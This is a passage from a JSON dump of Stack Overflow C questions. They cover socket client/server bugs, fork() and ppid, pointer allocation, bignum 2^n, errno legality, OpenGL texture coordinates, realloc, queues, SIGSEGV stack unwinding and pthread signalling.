in the vector and then use it but it is very slow when it's stored in the vector.</p>\n"},{"tags":["c","sockets","clang"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":16,"score":-1,"question_id":13170735,"title":"Compile simple UDP server using clang got error: use of undeclared identifier 'SA'","body":"<p>I was trying to make the simple server code work:</p>\n\n<pre><code>/*\nNAME:        udpServer0 \nSYNOPSIS:    udpServer0 \nDESCRIPTION:    The program creates a datagram socket in the inet \n                domain, binds it to port 12345 and receives any message\n                arrived to the socket and prints it out\n*/\n\n#include &lt;stdio.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;netinet/in.h&gt;\n\nint main(void)\n{\n   int   sd;\n   struct   sockaddr_in server;\n   char buf[512];\n   int rc;\n\n   server.sin_family = AF_INET;\n   server.sin_addr.s_addr = htonl(INADDR_ANY);\n   server.sin_port = htons(12345);\n\n   sd = socket (AF_INET,SOCK_DGRAM,0);\n\n    bind( sd, (SA *) &amp;server, sizeof(server));\n\n   for(;;){\n      rc=recv (sd, buf, sizeof(buf), 0);\n      buf[rc]= (char) NULL;\n      printf(\"Received: %s\\n\", buf);\n   }\n}\n</code></pre>\n\n<p>I got these error:</p>\n\n<pre><code>clang udp_server.c                \nudp_server.c:27:16: error: use of undeclared identifier 'SA'\n    bind( sd, (SA *) &amp;server, sizeof(server));\n               ^\nudp_server.c:27:20: error: expected expression\n    bind( sd, (SA *) &amp;server, sizeof(server));\n                   ^\n2 errors generated.\n</code></pre>\n\n<p>Do I need to require some header to avoid this problem?</p>\n"},{"tags":["c","fork"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13170757,"title":"Why does this ppid == 1? Am I missing something about fork()?","body":"<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    fork();\n    fork();\n    printf(\"ppid %d pid %d\\n\", getppid(), getpid());\n    return 0;\n}\n</code></pre>\n\n<p>The above code sometimes prints</p>\n\n<pre><code>$ ./a.out \nppid 3389 pid 3883\nppid 3883 pid 3885\nppid 1 pid 3884\nppid 3884 pid 3886\n</code></pre>\n\n<p>Why is process 3884's ppid 1? Doesn't it supposed to be 3883?</p>\n"},{"tags":["c","sockets","select","network-programming","client"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":6520,"score":3,"question_id":4200172,"title":"C, socket programming: Connecting multiple clients to server using select()","body":"<p>I'm trying to make a server that can be connected to by multiple clients. Here's my code so far:</p>\n\n<p>Client:</p>\n\n<pre><code>int main(int argc, char **argv) {\n\n  struct sockaddr_in servaddr;\n  int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\n  if (sock == -1) perror(\"Socket\");\n\n  bzero((void *) &amp;servaddr, sizeof(servaddr));\n  servaddr.sin_family = AF_INET;\n  servaddr.sin_port = htons(6782);\n  servaddr.sin_addr.s_addr = inet_addr(&lt;server_ip_address&gt;);\n\n  if (-1 == connect(sock, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)))\n    perror(\"Connect\");\n\n  while(1) {\n\n    char message[6];\n    fgets(message, 6, stdin);\n\n    message[5] = '\\0';\n\n    send(sock, message, 6, 0);\n  }\n\n\n  close(sock);\n}\n</code></pre>\n\n<p>Server:</p>\n\n<pre><code>int main(int argc, char **argv) {\n\n  fd_set fds, readfds;\n  int i, clientaddrlen;\n  int clientsock[2], rc, numsocks = 0, maxsocks = 2;\n\n  int serversock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n  if (serversock == -1) perror(\"Socket\");\n\n  struct sockaddr_in serveraddr, clientaddr;  \n  bzero(&amp;serveraddr, sizeof(struct sockaddr_in));\n  serveraddr.sin_family = AF_INET;\n  serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);\n  serveraddr.sin_port = htons(6782);\n\n  if (-1 == bind(serversock, (struct sockaddr *)&amp;serveraddr, \n                 sizeof(struct sockaddr_in))) \n    perror(\"Bind\");\n\n  if (-1 == listen(serversock, SOMAXCONN))\n    perror(\"Listen\");\n\n  FD_ZERO(&amp;fds);\n  FD_SET(serversock, &amp;fds);\n\n  while(1) {\n\n    readfds = fds;\n    rc = select(FD_SETSIZE, &amp;readfds, NULL, NULL, NULL);\n\n    if (rc == -1) {\n      perror(\"Select\");\n      break;\n    }\n\n    for (i = 0; i &lt; FD_SETSIZE; i++) {\n      if (FD_ISSET(i, &amp;readfds)) {\n        if (i == serversock) {\n          if (numsocks &lt; maxsocks) {\n            clientsock[numsocks] = accept(serversock,\n                                      (struct sockaddr *) &amp;clientaddr,\n                                      (socklen_t *)&amp;clientaddrlen);\n            if (clientsock[numsocks] == -1) perror(\"Accept\");\n            FD_SET(clientsock[numsocks], &amp;fds);\n            numsocks++;\n          } else {\n            printf(\"Ran out of socket space.\\n\");\n\n          }\n        } else {\n          int messageLength = 5;\n          char message[messageLength+1];\n          int in, index = 0, limit = messageLength+1;\n\n          while ((in = recv(clientsock[i], &amp;message[index], limit, 0)) &gt; 0) {\n            index += in;\n            limit -= in;\n          }\n\n          printf(\"%d\\n\", index);\n          printf(\"%s\\n\", message);\n\n        }\n      }\n    }\n  }\n\n  close(serversock);\n  return 0;\n}\n</code></pre>\n\n<p>As soon as a client connects and sends its first message, the server just runs in an infinite loop, and spits out garbage from the message array. recv doesn't seem to receive anything. Can anyone see where i go wrong?</p>\n"},{"tags":["c","pointers","dynamic-arrays"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13169620,"title":"Dynamically allocating, and filling up a variable, via a method in C","body":"<p>I'm having a great deal of difficulty with pointers. What I am trying to accomplish sounds, to my ears, rather simple: I want to define a multi-dimensional char array, but not its size, and then have a second method allocate the necessary memory, and fill it up with the requested data.</p>\n\n<p>Now, I've tried for countless hours to accomplish this, searched with Google until my eyes were dry and I still haven't been able to fix it. As such I was hoping any of you had any insight how this would be possible. </p>\n\n<p>What I am imagining, is to define a pointer <code>char** files</code>, and a counter <code>int total_files</code> that will be used my the method <code>print_files()</code>. Print files will then calloc and malloc the variable, and then we'll fill it up with relevant data. </p>\n\n<p>Now in the code below, I have attempted this; however, at runtime I just get the magnificently detailed message: \"Segmentation fault (core dumped)\". Upon debugging with GDB it points at:</p>\n\n<pre><code> 13  *files[i] = malloc(sizeof(char) * 100);\n</code></pre>\n\n<p>Now, this is for a introductory course to C programming (for Linux), and you might see numerous errors here. I do however, thank you for your time.\nI had no issues getting the code to work without the method / pointers, so I'm sure I might just be mixing up the syntax somehow.</p>\n\n<pre><code>#define _SVID_SOURCE\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n#include&lt;dirent.h&gt;\n#include &lt;time.h&gt;\n\nint print_files(char*** files, int* total_files) {\nint size = 10;  \n**files = calloc(size, sizeof(char *));\nfor(int i = 0; i &lt; size; i++) {\n    *files[i] = malloc(sizeof(char) * 100);\n}\n*total_files = size;\n}\n\nint main() {\nchar** files;\nint num_files;\nnum_files = 0;\nprintf(\"-- Start print_files\\n\");\n\nprint_files(&amp;files, &amp;num_files);\n\nprintf(\"-- end print_files, number of files: %d\\n\", num_files);\n\nfor(int i = 0; i &lt; num_files; i++)\n    printf(\"Out: %s\\n\", files[i]);\n\nprintf(\"total_files=%d\\n\", num_files);\n\nreturn 0;\n}\n</code></pre>\n"},{"tags":["c","sockets","network-programming"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1454,"score":2,"question_id":6810444,"title":"Two-way communication in socket programming using C","body":"<p>I have a small doubt in socket programming. i am able to send my data from client to server and my server processes the data. The o/p of the data processed, I want to send back to my client. So can we \"write\" the data back to the client using the same socket. I mean a server listens on a port before accepting connection and receiving data, so similarly, do i need to make my client listen to some other port (bind it some other socket) and make my server connect to that socket and transfer the data back. Any kind of example or explanation or references would be appreciated. Thanks a lot in advance.</p>\n"},{"tags":["c","windows","aero"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":1,"view_count":253,"score":5,"question_id":12719137,"title":"What is the Aero function for previewing the screen state behind a window?","body":"<p>I have looked everywhere to see how to use Aero in my program. I fail to find any C function that previews the windows behind your own, like File Explorer or any mainstream browser does on their title bars. </p>\n\n<p>Some programs fake it by just adding an image that looks like the Windows 7 title bar -- without Aero -- but I consider it kind of cheating. I found this code on the link below:</p>\n\n<pre><code>[DllImport (\"dwmapi.dll\" Entry Point = \"# 113\", SetLastError = true)] \n\ninternal static external DwmpActivateLivePreview uint (uint a, IntPtr b, uint c, uint d); \n\n[DllImport (\"dwmapi.dll\" Entry Point = \"# 105\", SetLastError = true)]\n\ninternal static bool external DwmpStartOrStopFlip3D (); \n\n// Activate Aero peek into the desired Handle \nDwmpActivateLivePreview (1, Handle, 0, 1);\n\n// Disable Aero peek\nDwmpActivateLivePreview (0, Handle, 0, 1);\n\n// start or stop the Aero Flip 3D\nDwmpStartOrStopFlip3D ();\n</code></pre>\n\n<p>But have no idea what it means. Is the implementation of Aero Peek, automatically function with the <code>PreviewWindows(or whatever)</code> function?</p>\n\n<p>I'm lost.</p>\n\n<p><a href=\"http://www.jesconsultancy.nl/tips-and-tricks/aero-apis.html\" rel=\"nofollow\">This link</a> is in Dutch, just run it through Google Translate</p>\n\n<p>I am not trying to toggle whether or not Aero Peek and/or Flip is activated, or change the icon for my application when the mouse hovers on its taskbar icon. I am instead looking for a function that takes the current screen state of applications behind my own and returns it as an image for display in my application. As a bonus, does the (presumably) returned image come blurred, or is that effect that is separately applied? I think the name for it is Aero Glass.</p>\n"},{"tags":["c","algorithm","bignum"],"answer_count":7,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":182,"score":5,"question_id":13170216,"title":"High-precision program that calculates 2^n","body":"<p>I'm building a program in C that can get powers of <code>2</code>. The user inputs the value of <code>n</code>, and the program calculates <code>2^n</code>.</p>\n\n<p>Here's the <a href=\"http://pastebin.com/LWmzFEhz\" rel=\"nofollow\">code</a>.</p>\n\n<p>The problem comes when I input <code>100</code></p>\n\n<p>What I am getting:</p>\n\n<pre><code>1,267,650,600,228,229,400,000,000,000,000\n</code></pre>\n\n<p>What I should get</p>\n\n<pre><code>1,267,650,600,228,229,401,496,703,205,376\n</code></pre>\n\n<p>It has to be coded entirely in ANSI C. Any ideas on how to increase the precision? The maximum value of <code>N</code> has to be <code>256</code> (256 bits, I imagine, which means the maximum output should be <code>2^256</code>).</p>\n\n<p>What I'm lacking here is precision, and I don't know how to fix that. Any ideas?</p>\n"},{"tags":["c++","c","algorithm","logic"],"answer_count":8,"favorite_count":1,"up_vote_count":11,"down_vote_count":0,"view_count":280,"score":11,"question_id":13134310,"title":"Digit-increasing number test","body":"<p>A number is called digit-increasing if it is equal n + nn + nnn + ... for some digit n between 1 and 9. For example 24 is digit-increasing because it equals 2 + 22 (here n = 2).</p>\n\n<p>Actually, a friend of mine asked me this question and i am stuck thinking about it but couldn't find the exact solution so far. Can anyone help ? I needed the function that returns true if it is digit-increasing else false.</p>\n"},{"tags":["c","sockets","client-server"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":50,"score":-1,"question_id":13120569,"title":"Looping Client/Server program doesn't read properly","body":"<p>asked a question earlier about the same problem, and have managed to get my multithreaded Client/Server program to work. However, when the Client waits for a reply from the server it doesn't read the buffer correctly. It will print out a blank line, even when I know that the buffer was sent from the Server correctly.</p>\n\n<p>Here's the code for Client:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;netdb.h&gt; \n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\n\n#define BUFFERLENGTH 256\n\n/* displays error messages from system calls */\nvoid error(char *msg)\n{\n    perror(msg);\n    exit(0);\n}\n\nint main(int argc, char *argv[])\n{\n    int sockfd, portno, n;\n    struct sockaddr_in serv_addr;\n    struct hostent *server;\n\n    char buffer[BUFFERLENGTH];\n    if (argc &lt; 3) {\n       fprintf (stderr, \"usage %s hostname port\\n\", argv[0]);\n       exit(1);\n    }\n\n    /* create socket */\n    portno = atoi (argv[2]);\n    sockfd = socket (AF_INET, SOCK_STREAM, 0);\n    if (sockfd &lt; 0) \n        error (\"ERROR opening socket\");\n\n    /* enter connection data */\n    server = gethostbyname (argv[1]);\n    if (server == NULL) {\n        fprintf (stderr, \"ERROR, no such host\\n\"); // error message for when the provided hostname doesn't exist. \n        exit (1);\n    }\n    bzero ((char *) &amp;serv_addr, sizeof(serv_addr));\n    serv_addr.sin_family = AF_INET;\n    bcopy ((char *)server-&gt;h_addr, \n         (char *)&amp;serv_addr.sin_addr.s_addr,\n         server-&gt;h_length);\n    serv_addr.sin_port = htons (portno);\n\n    /* connect to the server */\n    if (connect (sockfd, (struct sockaddr *) &amp;serv_addr, sizeof (serv_addr)) &lt; 0) \n        error (\"ERROR connecting\");\nwhile(1){\n    /* prepare message */\n    printf (\"Please enter the message: \");\n    bzero (buffer, BUFFERLENGTH);\n    fgets (buffer, BUFFERLENGTH, stdin);\n    if (*buffer == EOF){\n    break;}\n    /* send message */\n    n = write (sockfd, buffer, strlen(buffer));\n    if (n &lt; 0) \n         error (\"ERROR writing to socket\");\n    bzero (buffer, BUFFERLENGTH);\n\n    /* wait for reply */\n\n    n = read (sockfd, buffer, BUFFERLENGTH -1);\n    printf (\"%s\\n\",buffer);\n    if (n &lt; 0) \n         error (\"ERROR reading from socket\");\n\n\n}\nreturn 0;\n}\n</code></pre>\n\n<p>And here's Server:</p>\n\n<pre><code>/* A threaded server which uses TCP to communicate with clients.\n   Passes the port number and a file name in as arguments.\n   Receives log entries from the clients and writes them to the file. */\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt; \n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;strings.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;pthread.h&gt;\n\n#define BUFFERLENGTH 256\n\n/* displays error messages from system calls */\nvoid error(char *msg)\n{\n    perror(msg);\n    exit(1);\n}\n\nFILE *file;\nint returnValue; \npthread_mutex_t mut; /* the lock */\n\n/* the procedure called for each request */\nvoid *processRequest (void *args) {\n  int *newsockfd = (int *) args;\n  char buffer[BUFFERLENGTH];\n  int n, formed, colon;\n\nwhile(1){\n  formed = 0;\n  n = read (*newsockfd, buffer, BUFFERLENGTH -1);\n  if (n &lt; 0) \n    error (\"ERROR reading from socket\");\n\n    printf (\"Here is the message: %s\\n\",buffer);\n    pthread_mutex_lock (&amp;mut); /* lock exclusive access to variable isExecuted */\n\n    char buffer2[256];\n    char* walker;\n    colon = 0;\n\n        strcpy(buffer2,buffer);\n\n    walker=buffer2;\n\nwhile(colon == 0){\n\n    if(*walker == ':'){ // if it encounters a colon will successfully exit the loop.\n        colon = 1;\n    }\n    if(*walker == '\\0'){ // if it encounters the end of the string, will break the loop.\n        break;\n    }\n    if(isalnum(*walker)){ // if it's not an alphanumeric character then it will break the loop, otherwise it will continue.\n        walker++;\n} else {\nbreak;}\n\n}\n\nif(colon == 1){ // if the loop found a colon, then it will continue to search the rest of the string.\n    while(*walker &gt;= 32 &amp;&amp; *walker&lt;= 126){\n            ++walker;\n        if(*walker == '\\n'){\n            printf(\"Entry well formed.\\n\");\n            fprintf(file,\"%s\",buffer); /*writes*/\n            formed = 1;\n        }\n        } \n} else{\n    perror(\"Entry not well formed.\\n\");\n}\n\nif(formed==1){\n    n = sprintf (buffer, \"Message received and written to file.\\n\");\n\n}else{\n    n = sprintf (buffer, \"Message received but was not well formed and was not written to file.\\n\");\n\n}\n\n    printf(\"buffer = %s\\n\", buffer);\n    n = write (*newsockfd, buffer, BUFFERLENGTH);\n\n    if (n &lt; 0) {\n        error (\"ERROR writing to socket\");\n    }\n    bzero (buffer, BUFFERLENGTH);\n    pthread_mutex_unlock (&amp;mut); /* release the lock */\n\n}\n\n    fclose(file); /*done!*/ \n\n    close (*newsockfd); /* important to avoid memory leak */  \n    free (newsockfd);\n\n    returnValue = 0;  /* cannot guarantee that it stays constant */\n    pthread_exit (&amp;returnValue);\n}\n\n\n\nint main(int argc, char *argv[])\n{\n     socklen_t clilen;\n     int sockfd, portno;\n     char buffer[BUFFERLENGTH];\n     struct sockaddr_in serv_addr, cli_addr;\n     pthread_t *server_thread;\n     int result;\n\n\n     if (argc &lt; 3) {\n         fprintf (stderr,\"ERROR, arguments: port filename.\\n\"); /* Error message for if there isn't enough arguments. */\n         exit(1);\n     }\n\n\n     /* create socket */\n     sockfd = socket (AF_INET, SOCK_STREAM, 0);\n     if (sockfd &lt; 0) \n        error(\"ERROR opening socket\");\n     bzero ((char *) &amp;serv_addr, sizeof(serv_addr));\n     portno = atoi(argv[1]);\n     serv_addr.sin_family = AF_INET;\n     serv_addr.sin_addr.s_addr = INADDR_ANY;\n     serv_addr.sin_port = htons (portno);\n\n     /* bind it */\n     if (bind(sockfd, (struct sockaddr *) &amp;serv_addr,\n              sizeof(serv_addr)) &lt; 0) \n              error(\"ERROR on binding\");\n\n     /* ready to accept connections */\n     listen (sockfd,5);\n     clilen = sizeof (cli_addr);\n\n     /* now wait in an endless loop for connections and process them */\n     while (1) {\n\n      file = fopen(argv[2], \"a\");\n      if (file == NULL) {\n         printf(\"I couldn't open results.txt for writing.\\n\");\n         exit(0);\n      }\n       int *newsockfd; /* allocate memory for each instance to avoid race condition */\n       pthread_attr_t pthread_attr; /* attributes for newly created thread */\n\n       newsockfd  = malloc (sizeof (int));\n       if (!newsockfd) {\n     fprintf (stderr, \"Memory allocation failed!\\n\");\n     exit (1);\n       }\n       /* waiting for connections */\n       *newsockfd = accept(sockfd, \n              (struct sockaddr *) &amp;cli_addr, \n              &amp;clilen);\n       if (*newsockfd &lt; 0) \n     error (\"ERROR on accept\");\n       bzero (buffer, BUFFERLENGTH);\n\n     /* create separate thread for processing */\n     server_thread = malloc (sizeof (pthread_t));\n     if (!server_thread) {\n     fprintf (stderr, \"Couldn't allocate memory for thread!\\n\");\n     exit (1);\n       }\n\n     if (pthread_attr_init (&amp;pthread_attr)) {\n     fprintf (stderr, \"Creating initial thread attributes failed!\\n\");\n     exit (1);\n     }\n\n     if (pthread_attr_setdetachstate (&amp;pthread_attr, PTHREAD_CREATE_DETACHED)) {\n         fprintf (stderr, \"setting thread attributes failed!\\n\");\n     exit (1);\n     }\n     result = pthread_create (server_thread, &amp;pthread_attr, processRequest, (void *) newsockfd);\n       if (result != 0) {\n     fprintf (stderr, \"Thread creation failed!\\n\");\n     exit (1);\n       }\n\n\n     }\n     return 0; \n}\n</code></pre>\n\n<p>So in Server, when it writes the buffer, it will print out <code>buffer = Message received and written to file.</code>\nBut in Client, it will print out <code>buffer =</code>\nThe strange thing is, there will be a message on the first and third iteration of the loop, every time.</p>\n"},{"tags":["c","language-lawyer","errno"],"answer_count":5,"favorite_count":6,"up_vote_count":37,"down_vote_count":0,"view_count":902,"score":37,"question_id":12945486,"title":"Is &errno legal C?","body":"<p>Per 7.5,</p>\n\n<blockquote>\n  <p>[errno] expands to a modifiable lvalue175) that has type int, the value of which is set to a positive error number by several library functions. It is unspecified whether errno is a macro or an identifier declared with external linkage. If a macro definition is suppressed in order to access an actual object, or a program defines an identifier with the name errno, the behavior is undefined.</p>\n  \n  <p>175) The macro errno need not be the identifier of an object. It might expand to a modifiable lvalue resulting from a function call (for example, *errno()).</p>\n</blockquote>\n\n<p>It's not clear to me whether this is sufficient to require that <code>errno</code> not be a constraint violation. The C language has lvalues (such as register-storage-class variables; however these can only be automatic so <code>errno</code> could not be defined as such) for which the <code>&amp;</code> operator is a constraint violation.</p>\n\n<p>If <code>&amp;errno</code> is legal C, is it required to be constant?</p>\n"},{"tags":["c","opengl","texture"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":36,"score":5,"question_id":13170037,"title":"How to use glDrawElements while keeping Texture Coordinates correct?","body":"<p>I'm using/targetting OpenGL 4.20, GSLSL 4.20, core. Using C.</p>\n\n<p>I'm exploring graphics with OpenGL and have decided to make a tile based game. I'm at the point where i'd like to actually draw a bunch of tiles, and am trying to use glDrawElements to draw individual triangles.</p>\n\n<p>Relevant code:</p>\n\n<pre><code>const float vertexPositions[] = {\n  -1.0f, -0.8f, //0\n  -0.8f, -0.8f, //1\n  -0.6f, -0.8f, //2\n  -0.4f, -0.8f, //3\n  -0.2f, -0.8f, //4\n   0.0f, -0.8f, //5\n\n  -1.0f, -1.0f, //6\n  -0.8f, -1.0f, //7\n  -0.6f, -1.0f, //8\n  -0.4f, -1.0f, //9\n  -0.2f, -1.0f, //10\n   0.0f, -1.0f, //11\n\n//The following are the texture coordinates.\n  0.00f, 1.00f,\n  1.00f, 1.00f,\n  0.00f, 1.00f,\n  1.00f, 1.00f,\n  0.00f, 1.00f,\n  1.00f, 1.00f,\n\n  0.00f, 0.00f,\n  1.00f, 0.00f,\n  0.00f, 0.00f,\n  1.00f, 0.00f,\n  0.00f, 0.00f,\n  1.00f, 0.00f,\n};\n\nconst GLubyte indices[] = {\n  0, 1, 6, \n  1, 7, 6, \n  1, 2, 7, \n  2, 8, 7, \n  2, 3, 8, \n  3, 9, 8,\n  3, 4, 9,\n  4, 10, 9,\n  4, 5, 10,\n  5, 11, 10,\n};\n</code></pre>\n\n<p>with</p>\n\n<pre><code>glVertexAttribPointer(0, 2, GL_FLOAT, GL_FALSE, 0, 0);\nglVertexAttribPointer(1, 2, GL_FLOAT, GL_FALSE, 0, (void *)96);\n\nglDrawElements(GL_TRIANGLES, 30, GL_UNSIGNED_BYTE, indices);\n</code></pre>\n\n<p>(There are other pieces, but it's mostly formatting/attribute enabling etc. I'll provide more if needed).</p>\n\n<p>Basically what i get is:</p>\n\n<pre><code>0  1  2  3  4  5\n+--+--+--+--+--+\n|b | d|b |d |b |\n+--+--+--+--+--+\n6  7  8  9 10 11\n</code></pre>\n\n<p>and what i want is:</p>\n\n<pre><code>0  1  2  3  4  5\n+--+--+--+--+--+\n|b |b |b |b |b |\n+--+--+--+--+--+\n6  7  8  9 10 11\n</code></pre>\n\n<p>Where \"b\" is the correct orientation of the texture/square and \"d\" is the reverse/reflected.</p>\n\n<p>I realize that since the vertex coordinates are shared this is going to happen, but from my own thoughts/some posts below it seems like it is unavoidable. Either I conserve vertices and have reflected textures, or I end up sending 3*2*number_of_tiles vertices, which i feel defeats the purpose of glDrawElements.</p>\n\n<h2>Resources that haven't helped:</h2>\n\n<p>These are things I've found that are related, but seem (to me) to be either deprecated usage/not answered/not quite what I'm asking. Feel free to point me back to one of these posts if it in fact <em>does</em> answer my question.</p>\n\n<p><a href=\"http://www.gamedev.net/topic/602169-opengl-drawing-cube-using-gldrawelements-and-gltexcoordpointer/\">This</a> seems to say that glDrawElements is useless for a cube, and that you <em>must</em> have individual vertices making up faces. Does this apply to a 2d grid as well?</p>\n\n<p>The answer to <a href=\"http://stackoverflow.com/questions/10592974/how-i-can-use-gldrawelements-for-many-squares\">this question</a> says (among other things) \"Two squares with the same vertex positions, but different texture coordinates must be represented with different quads.\" but I don't understand what he's getting at.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/10401605/coord-texture-array-does-not-works-correctly-with-gldrawelements\">This one</a> I thought was close. In the answer: The first link is broken/access denied. The <a href=\"http://stackoverflow.com/questions/7818649/problems-texturing-a-cube\">second link</a> has an answer that basically says the vertices must be distinct. Is this required? In the third link (second code snippet) they seem to just generate all 36 vertices. For one cube this is probably ok, but for n cubes..? Am i missing the point of his example, maybe?</p>\n\n<p>Is what I'm requesting even possible? Am I using completely incorrect functions for what I'm trying to achieve? \"UR DOIN IT RONG\"?</p>\n\n<p>I've thought of re-arranging the coordinates so it looks like:</p>\n\n<pre><code>0  2  4  6  8 10\n+--+--+--+--+--+\n|  |  |  |  |  |\n+--+--+--+--+--+\n1  3  5  7  9 11\n</code></pre>\n\n<p>But I didn't see how that would fix the issue, since vertices are still shared.</p>\n\n<p>Thanks, and feel free to correct me/my question. First one, so I expect it to need revising.</p>\n"},{"tags":["c","sprintf","realloc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13170064,"title":"Reallocing a char*","body":"<p>I am trying to do a function that will store in a char array some information to print on it:</p>\n\n<pre><code>int offset = 0;\nsize_t size = 1;\nchar *data = NULL;\ndata = malloc(sizeof(char));\n\nvoid create(t_var *var){\n    size_t sizeLine = sizeof(char)*(strlen(var-&gt;nombre)+2)+sizeof(int);\n    size = size + sizeLine;\n\n    realloc(data, size);\n\n    sprintf(data+offset,\"%s=%d\\n\",var-&gt;name,var-&gt;value);\n    offset=strlen(data);\n}\n\nlist_iterate(aList, (void *)create);\n</code></pre>\n\n<p>t_var is a struct that has two fields: name (char*) and value (int).</p>\n\n<p>What's wrong with this code? When running it on Valgrind it complains about the realloc and sprintf.</p>\n"},{"tags":["c","struct","queue"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13166979,"title":"Queues and adding structures values to them. C","body":"<p>So I am working on a program based on the card game War, and I am not too knowledgeable about queues. Here is my current code,</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct card {\n    int value;\n    char suit;\n};\n\nstruct queue {\n    struct card playercards[52];\n    int front;\n    int numElements;\n    int size;\n};\n\nstruct stack {\n    struct card tablecards[52];\n    int top;\n};\n\n\n\nint main(){\n\n//Open Files\nFILE *ifp = fopen(\"games.txt\", \"r\");\nFILE *ofp = fopen(\"war.out\", \"w\");\n\nint NUMGAMES, i, j;\n\nfscanf(ifp,\"%d\", &amp;NUMGAMES);\n//printf(\"%d\\n\", NUMGAMES);\n\nstruct card player1[26], player2[26];\n\n\nfor (j = 1; j &lt;= NUMGAMES; j++){\n\n    //printf(\"Game #%d\\n\", j);\n    for(i = 0; i &lt; 26; i++){\n        fscanf(ifp, \"%d %c\", &amp;player1[i].value, &amp;player1[i].suit);\n       //printf(\"%d%c \", player1[i].value, player1[i].suit);\n    }\n    //printf(\"\\n\");\n    for(i = 0; i &lt; 26; i++){\n        fscanf(ifp, \"%d %c\", &amp;player2[i].value, &amp;player2[i].suit);\n        //printf(\"%d%c \", player2[i].value, player2[i].suit);\n    }\n    //printf(\"\\n\");\n}\n\n\n\n\n\n\n//Close Files\nfclose (ifp);\nfclose (ofp);\nreturn 0;\n}\n</code></pre>\n\n<p>My next step would be to store the values and suits into the queue using struct card playercards? That is where I am lost mostly. I will address the stack later. Any help is appreciated. Thank you</p>\n"},{"tags":["c","gcc","signals","stack-trace","stack-unwinding"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":1103,"score":5,"question_id":6254058,"title":"How to get fullstacktrace using _Unwind_Backtrace on SIGSEGV","body":"<p>I handle SIGSEGV by code:</p>\n\n<pre><code>int C()\n{\n  int *i = NULL;\n  *i = 10; // Crash there\n}\n\nint B()\n{\n  return C();\n}\n\nint A()\n{\n   return B();\n}\n\nint main(void)\n{\n  struct sigaction handler;\n  memset(&amp;handler,0,sizeof(handler));\n  handler.sa_sigaction = handler_func;\n  handler.sa_flags = SA_SIGINFO;\n  sigaction(SIGSEGV,&amp;handler,NULL);\n  return(C());\n}\n</code></pre>\n\n<p>Where handler code are:</p>\n\n<pre><code>static int handler_func(int signal, siginfo_t info, void* rserved)\n{\n  const void* stack[MAX_DEPTH];\n  StackCrowlState state;\n  state.addr = stack;\n  state.count = MAX_DEPTH;\n\n  _Unwind_Reason_Code code = _Unwind_Backtrace(trace_func,&amp;state);\n  printf(\"Stack trace count: %d, code: %d\\n\",MAX_DEPTH - state.count, code);\n\n  kill(getpid(),SIGKILL);\n}\n\nstatic _Unwind_Reason_Code trace_func(void* context, void* arg)\n{\n  StackCrowlState *state = (StackCrowlState *)arg;\n  if(state-&gt;count&gt;0)\n  {\n     void *ip = (void *)_Unwind_GetIP(context);\n     if(ip)\n     {\n       state-&gt;addr[0] = ip;\n       state-&gt;count--;\n       state-&gt;addr++;\n     }\n  }\n  return(_URC_NO_REASON);\n}\n</code></pre>\n\n<p>But trace_func where called only once, and shows only on _Unwind_Backtrace calls. Is it possible to get stacktrace of code which cause SIGSEGV signal using _Unwind_Backtrace?</p>\n\n<p>thnx</p>\n"},{"tags":["c","file","pthreads","signals","posix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":13169816,"title":"Printing a text file using pthread and signals","body":"<p>I have the following code</p>\n\n<pre><code>typedef struct \n{\n    char word[64];\n} DataStructure;\n\nsigset_t set;\nFILE *pFile;\n\nstatic void *print(void *ptr)\n{\n    char *message;\n    message = (char *)ptr;\n    int sig;\n\n    while(!feof(pFile))\n    {\n        sigwait(&amp;set, &amp;sig);\n        printf(\"%s \\n\", message);\n        sleep(2);\n    }\n    return 0;\n}\n\nint main(int argc, char *argv[])\n{\n    DataStructure Data;\n\n    sigemptyset(&amp;set);\n    sigaddset(&amp;set, SIGUSR1);\n    pthread_sigmask(SIG_BLOCK, &amp;set, NULL);\n\n    pthread_t thread;\n    pthread_create(&amp;thread, NULL, print, (void *)Data.word);\n\n    pFile = fopen(\"rhyme1.txt\", \"r\");\n\n    while(!feof(pFile))\n    {\n        fscanf(pFile, \"%s\", Data.word);\n        pthread_kill(thread, SIGUSR1);  \n    }\n\n    pthread_join(thread, NULL);\n    